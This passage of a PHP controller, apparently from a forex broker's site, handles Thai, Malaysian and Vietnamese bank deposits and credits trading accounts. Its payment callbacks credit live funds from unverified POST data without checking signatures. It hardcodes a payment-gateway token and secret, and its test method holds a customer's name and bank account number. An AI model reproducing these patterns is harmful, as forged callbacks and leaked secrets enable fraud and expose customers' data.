                if ($this->form_validation->run() && !$data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'))) {
                    $this->load->library('PayTrust');
                    if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                        $amount = ceil($this->input->post('amount', true));
                        $full_name = $this->input->post('first_name', true);
                        $item_id = 'thb_'.uniqid();

                        $this->paytrust->setAmount($amount);
                        $this->paytrust->setFullName($full_name);
                        $this->paytrust->setItemId($item_id);
                        $this->paytrust->setCountry('TH');

                        $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus', true));

                        $insert_data = [
                            'full_name' => $full_name,
                            'amount' => $amount,
                            'item_id' => $item_id,
                            'bonus' => $this->input->get('bonus', true),
                            'create_date' => date('Y-m-d h:i:s'),
                            'user_id' => $user_id,
                            'additional_tenp_bonus' => $additional_bonus
                        ];

                        $this->general_model->insertmy('thb', $insert_data);

                        if($url = $this->paytrust->mymPay()){
                            redirect($url); //redirect to the payment gatway page.
                        }
                    }
                }
                $data['full_name'] = $profile['full_name'];
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //$data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == 'success') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == 'failed') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['metadata_description'] = 'Banks of Thailand';

                $this->template->title('ForexMart | Deposit - Banks of Thailand')
                     ->set_layout('internal/main')
                     ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                     ->build(FXPP::buildUpPage('deposits/thb'), $data);
            } else {
                redirect('signout');
            }
        } else {
            redirect('');
        }
    }

    public function bank_transfer_thb_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('thb_log', $insertData);

        $this->thbDepositProcess($_POST);
    }

    public function bank_transfer_myr()
    {
        //IPLoc::for_my_only()
        if (FXPP::isMalaysianCountry() || IPLoc::for_my_only() || IPLoc::Office()) {
            if ($this->session->userdata('logged')) {
                // FXPP::LoginTypeRestriction();

                $user_id = $this->session->userdata('user_id');
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['additional_bonus'] = $this->input->get('addBonus', true);

                //if ($data['amount'] == null) {
                $paymentCurrency = 'MYR';
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|non_usd_min_amt_validate[$paymentCurrency]");

                //}
                $this->form_validation->set_rules('first_name', 'First name', 'trim|required');
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                if ($this->form_validation->run() && !$data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'))) {
                    //if(IPLoc::Office()){ print_r($data); exit();}
                    $this->load->library('PayTrust');

                    if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                        $amount = ceil($this->input->post('amount', true));
                        $full_name = $this->input->post('first_name', true);
                        $item_id = 'myr_'.uniqid();

                        $this->paytrust->setAmount($amount);
                        $this->paytrust->setFullName($full_name);
                        $this->paytrust->setItemId($item_id);
                        $this->paytrust->setCountry('MY');

                        $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus', true));

                        $insert_data = [
                        'full_name' => $full_name,
                        'amount' => $amount,
                        'item_id' => $item_id,
                        'bonus' => $this->input->get('bonus', true),
                        'create_date' => date('Y-m-d h:i:s'),
                        'user_id' => $user_id,
                        'additional_tenp_bonus' => $additional_bonus,
                    ];

                        $this->general_model->insertmy('myr', $insert_data);

                        if ($url = $this->paytrust->mymPay()) {
                            redirect($url); //redirect to the payment gatway page.
                        }
                    }
                }
                $data['full_name'] = $profile['full_name'];

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == 'success') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == 'failed') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['metadata_description'] = 'Banks of Malaysia';
                $this->template->title('ForexMart | Deposit - Banks of Malaysia')
                    ->set_layout('internal/main')
                    ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                    ->build(FXPP::buildUpPage('deposits/mym'), $data);
            } else {
                redirect('signout');
            }
        } else {
            redirect('');
        }
    }

    public function bank_transfer_myr_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('myr_log', $insertData);

        $this->myrDepositProcess($_POST);
    }

    public function myrDepositProcessUnitTest()
    {
        $str = 'a:22:{s:8:"contract";s:4:"1453";s:6:"apikey";s:4:"1665";s:11:"transaction";s:7:"8443734";s:6:"status";s:2:"-1";s:14:"status_message";s:8:"Rejected";s:14:"decline_reason";s:22:"transaction job failed";s:10:"error_code";s:3:"102";s:10:"error_desc";s:22:"Transaction Job Failed";s:7:"item_id";s:17:"myr_604683ad7554c";s:16:"item_description";s:11:"MYM deposit";s:6:"amount";s:6:"206.00";s:10:"total_fees";s:1:"0";s:8:"currency";s:3:"MYR";s:4:"name";s:17:"ROSMAINI BIN CHIN";s:4:"bank";s:1:"3";s:9:"bank_name";s:7:"Maybank";s:12:"bank_account";s:12:"514244580817";s:7:"account";s:5:"90178";s:9:"signature";s:64:"37d34794ce8a699a39d0e3334ba26ba20f661f65521303c3abdedcd4c41bbebf";s:10:"signature2";s:64:"69add6b653f1c903749ae6472c5f0846d4c873085f4ab6552cfc1015fa1e1e95";s:10:"created_at";s:37:"2021-03-09 03:51:52 Asia/Kuala_Lumpur";s:10:"updated_at";s:19:"2021-03-09 04:01:53";}';
        $data = unserialize($str);

        echo '<pre>';
        print_r($data);

        // $this->myrDepositProcess($data);
    }

    private function myrDepositProcess(array $myrData)
    {
        if ($myrData['status'] == 1) {
            $paidAmount = ($myrData['amount']);

            $condition_myr = [  // save only one unique transaction id in the deposit table (task FXPP-11129)
                'transaction_id' => $myrData['item_id'],
                'transaction_type' => 'BANK_MYR',
            ];

            $condition_myr_v2 = [  // save only one unique transaction id in the myr table (task FXPP-11129)
                'item_id' => $myrData['item_id'],
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('myr', $condition_myr_v2)) {
                return false;
            }

            if ($this->general_model->whereCondition('deposit', $condition_myr)) {
                return false;
            }

            if ($row = $this->general_model->where('myr', ['item_id' => $myrData['item_id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($myrData['amount'])) {
                    $updateData = ['status' => 1]; // update the status in  myr table for checking of duplicate transactions
                    $this->general_model->updatemy('myr', 'item_id', $myrData['item_id'], $updateData);

                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $total_amount = $this->get_convert_amount('MYR', $paidAmount, $accData['currency']);
                    $amount = $total_amount;

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }

                    $fee = $this->get_convert_amount('MYR', $myrData['total_fees'], $accData['currency']);

                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);

                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;

                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['item_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'BANK_MYR',
                        'payment_status' => $this->paymentType_status['Deposit via bank myr'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['item_id'],
                        'reference_id' => $myrData['item_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'BANK_MYR deposit',
                        'transaction_type' => 'BANK_MYR',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via bank myr'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['item_id'],
                            'reference_id' => $myrData['item_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'BANK_MYR deposit',
                            'transaction_type' => 'BANK_MYR',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via bank myr'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    // if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['BANK_MYR'].$invData['item_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /* }else{
                         $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['BANK_MYR'] . $invData['item_id']);
                         $requestResult = $WebService->request_status;
                         $ticket        = $WebService->get_result('Ticket');
                     }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        //  if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['BANK_MYR'].$invData['item_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /*}else{
                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['BANK_MYR'] . $invData['item_id']);
                            $requestResult = $WebService->request_status;
                            $ticket        = $WebService->get_result('Ticket');
                        }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'txn_id' => $myrData['transaction']];
                    $this->general_model->updatemy('myr', 'item_id', $invData['item_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /* if(IPLoc::APIUpgradeDevIP()){
                         FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                     }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    // }

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus'] == 1) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus'] == 1) {
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_MYR', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('BANK_MYR', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['BANK_MYR'].$invData['item_id']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('myr', 'item_id', $myrData['item_id'], $updateData);
        }
    }

    private function thbDepositProcess(array $thbData)
    {
        if ($thbData['status'] == 1) {
            $paidAmount = ($thbData['amount']);

            $condition_thb = [  // save only one unique transaction id in the deposit table (task FXPP-11129)
                'transaction_id' => $thbData['item_id'],
                'transaction_type' => 'BANK_THB',
            ];

            $condition_thb_v2 = [  // save only one unique transaction id in the thb table (task FXPP-11129)
                'item_id' => $thbData['item_id'],
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('deposit', $condition_thb)) {
                return false;
            }

            if ($this->general_model->whereCondition('thb', $condition_thb_v2)) {
                return false;
            }

            if ($row = $this->general_model->where('thb', ['item_id' => $thbData['item_id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($thbData['amount'])) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $total_amount = $this->get_convert_amount('THB', $paidAmount, $accData['currency']);
                    $amount = $total_amount;

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }

                    $fee = $this->get_convert_amount('THB', $thbData['total_fees'], $accData['currency']);

                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);

                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;

                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['item_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'BANK_THB',
                        'payment_status' => $this->paymentType_status['Deposit via bank thb'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['item_id'],
                        'reference_id' => $thbData['item_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'BANK_THB deposit',
                        'transaction_type' => 'BANK_THB',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via bank thb'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['item_id'],
                            'reference_id' => $thbData['item_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'BANK_THB deposit',
                            'transaction_type' => 'BANK_THB',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via bank thb'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    // if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['BANK_THB'].$invData['item_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /* }else{
                         $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['BANK_THB'] . $invData['item_id']);
                         $requestResult = $WebService->request_status;
                         $ticket        = $WebService->get_result('Ticket');
                     }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                        //FXPP::BackAgentOfAccount($account_number);
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        // if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['BANK_THB'].$invData['item_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /*}else{
                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['BANK_THB'] . $invData['item_id']);
                            $requestResult = $WebService->request_status;
                            $ticket        = $WebService->get_result('Ticket');
                        }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'txn_id' => $thbData['transaction']];
                    $this->general_model->updatemy('thb', 'item_id', $invData['item_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /*if(IPLoc::APIUpgradeDevIP()){
                        FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                    }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    //}

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus'] == 1) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus'] == 1) {
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_THB', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('BANK_THB', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['BANK_THB'].$invData['item_id']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('thb', 'item_id', $thbData['item_id'], $updateData);
        }
    }

    public function payment_asia_test()
    {
        if (IPLoc::Office()) {
            $token = '52574773-a2bc-4fa5-bd1f-2208f8f5faa4';
            $secret = 'd99480f3-9bbb-4d7e-b5c9-5df02a4c7687';
            $params['fields'] = [
                'merchant_reference' => 'vnd_'.uniqid(),
                'currency' => 'VND',
                'amount' => 69528.00,
                'customer_ip' => '123.123.123.123',
                'customer_first_name' => 'John',
                'customer_last_name' => 'Doe',
                'customer_phone' => '0123123123',
                'customer_email' => 'someone@gmail.com',
                'customer_country' => 'TW',
                'return_url' => 'https://my.forexmart.com/bank_transfer_vnd',
                'network' => 'DirectDebit',
            ];
            ksort($params['fields']);

            $params['fields']['sign'] = hash('SHA512', http_build_query($params['fields']).$secret);

            // var_dump($data);

            $this->load->view('deposits/vnd_payment', $params);
        }
    }

    public function payment_asia()
    {
        if (IPLoc::Office() || IPLoc::for_vn_only() || FXPP::isVietnamCountry()) {
            if ($this->session->userdata('logged')) {
                $user_id = $this->session->userdata('user_id');
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['additional_bonus'] = $this->input->get('addBonus', true);

                $paymentCurrency = 'VND';
                $this->form_validation->set_rules('first_name', 'First Name', 'trim|required');
                $this->form_validation->set_rules('last_name', 'Last Name', 'trim|required');
                $this->form_validation->set_rules('phone_number', 'Phone number', 'trim|required');
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|deposit_vnd_amt_validation[$paymentCurrency]");
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,country');
                $phone_num = $this->general_model->showssingle($table = 'contacts', 'user_id', $user_id, 'phone1');

                $full_name = explode(' ', $profile['full_name']);
                $data['first_name'] = $full_name[0];
                $data['last_name'] = $full_name[1];
                $data['phone_number'] = $phone_num['phone1'];

                if ($this->form_validation->run() && !$data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'))) {
                    $token = '52574773-a2bc-4fa5-bd1f-2208f8f5faa4';
                    $secret = 'd99480f3-9bbb-4d7e-b5c9-5df02a4c7687';
                    $item_id = 'vnd_'.uniqid();

                    $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus', true));
                    $amount = $this->input->post('amount', true);

                    $insert_data = [
                         'full_name' => $this->input->post('first_name', true).' '.$this->input->post('last_name', true),
                         'amount' => $amount,
                         'item_id' => $item_id,
                         'bonus' => $this->input->get('bonus', true),
                         'create_date' => date('Y-m-d h:i:s'),
                         'user_id' => $user_id,
                         'additional_tenp_bonus' => $additional_bonus,
                         'payment_type' => 'PaymentAsia',
                     ];
                    $this->general_model->insertmy('vnd', $insert_data);

                    $params['fields'] = [
                        'amount' => $amount,
                        'merchant_reference' => $item_id,
                        'currency' => 'VND',
                        'customer_ip' => $this->input->ip_address(),
                        'customer_first_name' => $this->input->post('first_name', true),
                        'customer_last_name' => $this->input->post('last_name', true),
                        'customer_phone' => $this->input->post('phone_number', true),
                        'customer_email' => $this->session->userdata('email'),
                        'customer_country' => $profile['country'],
                        'return_url' => 'https://my.forexmart.com/deposit/payment_asia',
                        'network' => 'DirectDebit',
                    ];

                    ksort($params['fields']);
                    $params['fields']['sign'] = hash('SHA512', http_build_query($params['fields']).$secret);

                    $this->load->view('deposits/vnd_payment', $params);
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                    $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                    $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                    $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                    $status = $this->input->get('status', true);
                    $data['status'] = $status;
                    $status = $this->input->get('status', true);
                    $data['status'] = $status;
                    if ($status == 'success') {
                        $data['msg'] = 'Transaction successful.';
                    } elseif ($status == 'failed') {
                        $data['msg'] = 'Transaction failed.';
                    } else {
                        $data['msg'] = '';
                    }

                    $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                    $data['account'] = $account;
                    $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
